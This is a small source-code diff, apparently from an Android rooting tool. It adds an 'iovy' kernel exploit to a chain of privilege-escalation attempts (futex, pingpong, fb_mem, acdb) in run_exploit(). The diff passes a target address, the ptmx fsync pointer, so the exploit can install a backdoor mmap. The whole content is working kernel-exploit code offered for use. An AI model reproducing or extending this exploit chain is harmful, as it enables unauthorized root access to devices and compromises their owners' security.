@@ -18,6 +18,7 @@
 #include "libfutex_exploit/futex.h"
 #include "libpingpong_exploit/pingpong.h"
 #include "libfb_mem_exploit/fb_mem.h"
+#include "libiovy_exploit/iovy.h"
 #include "backdoor_mmap.h"
 #include "build_remap_pfn_range.h"
 
@@ -389,6 +390,12 @@ run_exploit(void)
   }
 
   ptmx_fsync_address = ptmx_fops_address + 0x38;
+
+  printf("Attempt iovy exploit...\n");
+  if (iovy_run_exploit(ptmx_fsync_address, (int)&install_mmap,
+                       run_install_mmap, (void *)ptmx_fops_address)) {
+    return true;
+  }
 
   printf("Attempt acdb exploit...\n");
   if (acdb_run_exploit(ptmx_fsync_address, (int)&install_mmap,
